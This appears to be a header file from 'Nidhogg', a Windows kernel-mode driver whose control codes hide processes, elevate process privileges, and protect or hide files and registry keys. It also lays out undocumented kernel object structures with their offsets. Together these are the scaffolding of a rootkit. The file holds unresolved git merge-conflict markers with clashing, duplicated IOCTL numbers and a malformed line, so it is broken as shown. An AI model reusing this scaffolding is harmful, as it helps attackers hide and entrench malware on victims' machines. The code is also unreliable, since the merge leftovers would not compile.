#pragma once

// Includes.
#include "FastMutex.h"
#include "AutoLock.h"

#define DRIVER_PREFIX "Nidhogg: "
#define DRIVER_DEVICE_NAME L"\\Device\\Nidhogg"
#define DRIVER_SYMBOLIC_LINK L"\\??\\Nidhogg"
#define DRIVER_TAG 'hdiN'
#define OB_CALLBACKS_ALTITUDE L"31105.6171"
#define REG_CALLBACK_ALTITUDE L"31122.6172"

// ** IOCTLS ********************************************************************************************
#define IOCTL_NIDHOGG_PROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_HIDE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_ELEVATE_PROCESS CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_PROCESSES CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)

<<<<<<< HEAD
#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_FILES CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)

<<<<<<< HEAD
#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
// #define IOCTL_NIDHOGG_HIDE_REGITEM CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS) --> Currently protect and hide is the same, will be changed in the future.
=======
#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
// #define IOCTL_NIDHOGG_HIDE_REGITEM CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS) --> Currently protect and hide is the same, will be changed in the future.
>>>>>>> 0a9676d (Pre version 0.1 (#6))
=======
#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
// #define IOCTL_NIDHOGG_HIDE_REGITEM CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS) --> Currently protect and hide is the same, will be changed in the future.
>>>>>>> 4fc3e3e (Added file query ability)
// *****************************************************************************************************

#define MAX_PIDS 256
#define MAX_PATH 260
#define MAX_FILES 256
#define MAX_REG_ITEMS 256
#define REG_VALUE_LEN 260
#define REG_KEY_LEN 255

// Prototypes.
NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status = STATUS_SUCCESS, ULONG_PTR info = 0);
DRIVER_UNLOAD NidhoggUnload;
DRIVER_DISPATCH NidhoggDeviceControl, NidhoggCreateClose;
void ClearAll();

// Globals.
PVOID registrationHandle = NULL;

struct ProcessesList {
	int PidsCount;
	ULONG Pids[MAX_PIDS];
};

struct ProcessGlobals {
	ProcessesList Processes;
	FastMutex Lock;

	void Init() {
<<<<<<< HEAD
		Processes. PidsCount = 0;
=======
		PidsCount = 0;
>>>>>>> 0a9676d (Pre version 0.1 (#6))
		Lock.Init();
	}
};
ProcessGlobals pGlobals;

struct FileItem {
	int FileIndex;
	WCHAR FilePath[MAX_PATH];
};

struct FilesList {
	int FilesCount;
	WCHAR* FilesPath[MAX_FILES];
};

struct FileGlobals {
	FilesList Files;
	FastMutex Lock;

	void Init() {
		Files.FilesCount = 0;
		Lock.Init();
	}
};
FileGlobals fGlobals;

struct RegItem {
	int Type;
	WCHAR KeyPath[REG_KEY_LEN];
	WCHAR ValueName[REG_VALUE_LEN];
};

struct RegKeys {
	int KeysCount;
	WCHAR* KeysPath[MAX_REG_ITEMS];
};

struct RegValues {
	int ValuesCount;
	WCHAR* ValuesPath[MAX_REG_ITEMS];
	WCHAR* ValuesName[REG_VALUE_LEN];
};

struct RegistryGlobals {
	RegKeys Keys;
	RegValues Values;
	LARGE_INTEGER RegCookie;
	FastMutex Lock;

	void Init() {
		Keys.KeysCount = 0;
		Values.ValuesCount = 0;
		Lock.Init();
	}
};
RegistryGlobals rGlobals;

// Undocumented structs
struct _OBJECT_TYPE_INITIALIZER_TEMP
{
	USHORT Length;                                                          //0x0
	union
	{
		USHORT ObjectTypeFlags;                                             //0x2
		struct
		{
			UCHAR CaseInsensitive : 1;                                        //0x2
			UCHAR UnnamedObjectsOnly : 1;                                     //0x2
			UCHAR UseDefaultObject : 1;                                       //0x2
			UCHAR SecurityRequired : 1;                                       //0x2
			UCHAR MaintainHandleCount : 1;                                    //0x2
			UCHAR MaintainTypeList : 1;                                       //0x2
			UCHAR SupportsObjectCallbacks : 1;                                //0x2
			UCHAR CacheAligned : 1;                                           //0x2
			UCHAR UseExtendedParameters : 1;                                  //0x3
			UCHAR Reserved : 7;                                               //0x3
		};
	};
	ULONG ObjectTypeCode;                                                   //0x4
	ULONG InvalidAttributes;                                                //0x8
	struct _GENERIC_MAPPING GenericMapping;                                 //0xc
	ULONG ValidAccessMask;                                                  //0x1c
	ULONG RetainAccess;                                                     //0x20
	enum _POOL_TYPE PoolType;                                               //0x24
	ULONG DefaultPagedPoolCharge;                                           //0x28
	ULONG DefaultNonPagedPoolCharge;                                        //0x2c
	VOID(*DumpProcedure)(VOID* arg1, struct _OBJECT_DUMP_CONTROL* arg2);   //0x30
	LONG(*OpenProcedure)(enum _OB_OPEN_REASON arg1, CHAR arg2, struct _EPROCESS* arg3, VOID* arg4, ULONG* arg5, ULONG arg6); //0x38
	VOID(*CloseProcedure)(struct _EPROCESS* arg1, VOID* arg2, ULONGLONG arg3, ULONGLONG arg4); //0x40
	VOID(*DeleteProcedure)(VOID* arg1);                                    //0x48
	union
	{
		LONG(*ParseProcedure)(VOID* arg1, VOID* arg2, struct _ACCESS_STATE* arg3, CHAR arg4, ULONG arg5, struct _UNICODE_STRING* arg6, struct _UNICODE_STRING* arg7, VOID* arg8, struct _SECURITY_QUALITY_OF_SERVICE* arg9, VOID** arg10); //0x50
		LONG(*ParseProcedureEx)(VOID* arg1, VOID* arg2, struct _ACCESS_STATE* arg3, CHAR arg4, ULONG arg5, struct _UNICODE_STRING* arg6, struct _UNICODE_STRING* arg7, VOID* arg8, struct _SECURITY_QUALITY_OF_SERVICE* arg9, struct _OB_EXTENDED_PARSE_PARAMETERS* arg10, VOID** arg11); //0x50
	};
	LONG(*SecurityProcedure)(VOID* arg1, enum _SECURITY_OPERATION_CODE arg2, ULONG* arg3, VOID* arg4, ULONG* arg5, VOID** arg6, enum _POOL_TYPE arg7, struct _GENERIC_MAPPING* arg8, CHAR arg9); //0x58
	LONG(*QueryNameProcedure)(VOID* arg1, UCHAR arg2, struct _OBJECT_NAME_INFORMATION* arg3, ULONG arg4, ULONG* arg5, CHAR arg6); //0x60
	UCHAR(*OkayToCloseProcedure)(struct _EPROCESS* arg1, VOID* arg2, VOID* arg3, CHAR arg4); //0x68
	ULONG WaitObjectFlagMask;                                               //0x70
	USHORT WaitObjectFlagOffset;                                            //0x74
	USHORT WaitObjectPointerOffset;                                         //0x76
};

struct _EX_PUSH_LOCK_TEMP
{
	union
	{
		struct
		{
			ULONGLONG Locked : 1;                                             //0x0
			ULONGLONG Waiting : 1;                                            //0x0
			ULONGLONG Waking : 1;                                             //0x0
			ULONGLONG MultipleShared : 1;                                     //0x0
			ULONGLONG Shared : 60;                                            //0x0
		};
		ULONGLONG Value;                                                    //0x0
		VOID* Ptr;                                                          //0x0
	};
};

typedef struct _OBJECT_TYPE_TEMP
{
	struct _LIST_ENTRY TypeList;                                            //0x0
	struct _UNICODE_STRING Name;                                            //0x10
	VOID* DefaultObject;                                                    //0x20
	UCHAR Index;                                                            //0x28
	ULONG TotalNumberOfObjects;                                             //0x2c
	ULONG TotalNumberOfHandles;                                             //0x30
	ULONG HighWaterNumberOfObjects;                                         //0x34
	ULONG HighWaterNumberOfHandles;                                         //0x38
	struct _OBJECT_TYPE_INITIALIZER_TEMP TypeInfo;                               //0x40
	struct _EX_PUSH_LOCK_TEMP TypeLock;                                          //0xb8
	ULONG Key;                                                              //0xc0
	struct _LIST_ENTRY CallbackList;                                        //0xc8
} OBJECT_TYPE_TEMP, * POBJECT_TYPE_TEMP;
